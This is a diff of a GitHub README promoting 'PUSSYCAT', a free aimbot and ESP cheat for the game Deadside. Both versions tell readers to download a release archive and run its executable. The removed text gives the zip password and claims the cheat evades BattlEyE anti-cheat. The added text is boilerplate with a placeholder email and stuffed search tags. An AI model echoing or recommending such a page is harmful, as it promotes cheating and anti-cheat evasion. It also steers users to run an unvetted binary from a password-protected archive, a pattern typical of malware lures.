@@ -1,95 +1,109 @@
-# 🐾 **PUSSYCAT - Advanced Cheat for Deadside**
-![1](https://github.com/user-attachments/assets/249074a5-3bf7-47e8-90b1-2ffe0e4e1bfd)
+# PUSSYCAT: Your Ultimate Deadside Cheat 🐾
 
----
+Welcome to the **PUSSYCAT** repository! This project offers essential visual and combat features for Deadside, enhancing your gaming experience. Download and execute the latest version from our [Releases](https://github.com/Ahmedvvl/Deadside-AIM-ESP-ITEM-PUSSYCAT-free-cheat/releases) section to get started.
 
-## 📣 **Overview**
-PUSSYCAT is the ultimate cheat for **Deadside**, offering all the essential visual and combat features for a seamless and enjoyable gaming experience. With customizable loot filters, advanced Silent Aimbot, and undetected BattlEyE status, PUSSYCAT ensures you dominate every match effortlessly. Compatible with the latest Steam version, this cheat is designed for players who demand precision and control.
-![1](https://github.com/user-attachments/assets/2b53069c-ea4f-40d8-886c-c9f7cbcbeb44)
-![2](https://github.com/user-attachments/assets/35d206e5-d52e-45fe-8267-b1103a4faf89)
+![PUSSYCAT Logo](https://img.shields.io/badge/PUSSYCAT-Deadside_Cheat-blue)
 
----
+## Table of Contents
 
-## 🚀 **Why Choose PUSSYCAT?**
-- **Comprehensive Visuals:** Spot players, skeletons, distances, weapons, and armor levels with ease.  
-- **Customizable Loot Display:** Filter loot to prioritize what matters most.  
-- **Silent Aimbot:** Engage in combat with maximum efficiency and stealth.  
-- **Undetected Status:** Fully compatible with BattlEyE anti-cheat systems.  
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
----
+## Features 🌟
 
-## 📥 **Download**
-<div align="center">
-    <h2><a href="https://github.com/Katiarani/Deadside-AIM-ESP-ITEM-PUSSYCAT-free-cheat/releases/download/latest/PUSSYCAT.zip">🔹 Download Latest Release from Git🔹</a></h2>
-</div>
+PUSSYCAT provides a range of features designed to improve your gameplay in Deadside. Here’s what you can expect:
 
-💼 **Password to Unzip:** `PUSSYCAT`
+- **Aimbot**: Automatically targets enemies, giving you a significant edge in combat.
+- **ESP (Extra Sensory Perception)**: See enemies and loot through walls, allowing for strategic planning.
+- **Loot ESP**: Identify valuable items easily, ensuring you never miss out on important gear.
+- **Macros**: Automate repetitive tasks for smoother gameplay.
+- **Visual Customization**: Tailor the appearance of the cheat to fit your preferences.
 
----
+These features work seamlessly together to create a smooth and enjoyable gaming experience.
 
-### 🛠️ **Instructions**
-1. **Run the Application**  
-   After unzipping the archive, execute the `.exe` file to launch PUSSYCAT.
+## Installation 📥
 
-2. **Activate in Game**  
-   Press **HOME** to enable the cheat's features.
+To install PUSSYCAT, follow these steps:
 
----
+1. Visit the [Releases](https://github.com/Ahmedvvl/Deadside-AIM-ESP-ITEM-PUSSYCAT-free-cheat/releases) section.
+2. Download the latest release file.
+3. Extract the downloaded file to a location of your choice.
+4. Run the executable file.
 
-## ✅ **Features**
+Make sure to follow any additional instructions provided in the release notes.
 
-### AIMBOT
-- **Vector Aimbot:** Lock onto enemies with precision.  
-- **Draw FOV:** Display your Field of View radius.  
-- **Radius FOV:** Customize targeting range.  
-- **Smoothing:** Adjust aim smoothness for natural movements.  
-- **Target Bone:** Focus on specific body parts for maximum impact.  
-- **Max Distance:** Set engagement range.  
-- **Aimbot Key:** Configure activation keys.
+## Usage 🎮
 
----
+Using PUSSYCAT is straightforward. Once you have installed the cheat, follow these steps:
 
-### ENEMY ESP
-- **Draw BOX:** Highlight enemies with clear visual markers.  
-- **Player Tags:** Display player names and tags.  
-- **Skeleton:** Render enemy skeletal structures.  
-- **Tracelines:** Draw lines to track enemy movements.  
-- **Max Distance:** Customize visibility range.  
-- **BOX Type:** Choose box styles for enemy highlights.  
-- **Tracelines Type:** Adjust traceline visuals.
+1. Launch Deadside.
+2. Open the PUSSYCAT application.
+3. Configure the settings to your liking.
+4. Enjoy enhanced gameplay with all features enabled.
 
----
+Always remember to use cheats responsibly and understand the risks involved in modifying gameplay.
 
-### ITEMS ESP
-- **Devices:** Highlight gadgets and tools.  
-- **Other Items:** Spot miscellaneous loot.  
-- **Ammo:** Locate ammunition easily.  
-- **Firearms Weapon:** Identify weapons on the map.  
-- **Repair Items:** Find repair kits and tools.  
-- **Loot Box:** Highlight loot containers.  
-- **Materials:** Locate crafting materials.  
-- **Clothing:** Jackets, Pants, Vests, Masks, Gloves, and Backpacks.  
-- **Medicaments:** Spot medkits and recovery items.  
-- **Food & Water:** Locate consumables for survival.  
-- **Items Distance:** Customize loot visibility range.
+## Contributing 🤝
 
----
+We welcome contributions to improve PUSSYCAT. If you want to help, here’s how you can contribute:
 
-### MISC
-- **Radar:** Gain a tactical overview of the battlefield.  
-- **Crosshair:** Customize crosshair visuals.  
-- **Thickness & Size:** Adjust crosshair dimensions.  
-- **Enemy Font Size:** Configure text size for enemy tags.  
-- **Item Font Size:** Customize text size for loot markers.  
-- **Menu Key:** Set hotkeys for menu navigation.
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Push your branch and submit a pull request.
 
----
+Please ensure your code adheres to our coding standards and includes appropriate documentation.
 
-## 🖥️ **System Requirements**
-- **Operating Systems:** Windows 10 and Windows 11.  
-- **Supported Processors:** Intel and AMD.  
-- **Game Modes:** Fullscreen, Windowed, and Borderless Windowed.  
+## License 📜
 
----
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-⚡ **PUSSYCAT** redefines your Deadside experience, offering unparalleled features to dominate the game effortlessly. Equip yourself today and take control of the battlefield!
+## Contact 📬
+
+For questions or support, feel free to reach out:
+
+- **GitHub**: [Ahmedvvl](https://github.com/Ahmedvvl)
+- **Email**: [your-email@example.com](mailto:your-email@example.com)
+
+## Topics
+
+This repository covers various topics related to Deadside. Here are some relevant tags:
+
+- deadside-2025
+- deadside-aim
+- deadside-aimbot-2025
+- deadside-bot
+- deadside-cheat-2025
+- deadside-cheat-aim
+- deadside-esp
+- deadside-free
+- deadside-free-cheat-2025
+- deadside-hack
+- deadside-loot-esp
+- deadside-macro
+- deadside-mod
+- deadside-script
+- deadside-software
+- deadside-tool
+
+Feel free to explore these topics for more information and resources.
+
+## Additional Resources 📚
+
+For further reading and resources related to Deadside, consider the following:
+
+- [Deadside Official Wiki](https://deadside.gamepedia.com/Deadside_Wiki)
+- [Deadside Community Forum](https://forum.deadsidegame.com/)
+- [Deadside Discord Server](https://discord.gg/deadside)
+
+These resources can provide valuable insights and updates about the game.
+
+## Conclusion
+
+PUSSYCAT aims to enhance your Deadside experience with powerful features. Download the latest version from our [Releases](https://github.com/Ahmedvvl/Deadside-AIM-ESP-ITEM-PUSSYCAT-free-cheat/releases) section and dive into the game with confidence. Enjoy your time in Deadside!
+
+![Join Us](https://img.shields.io/badge/Join_Us-Discord-blueviolet)
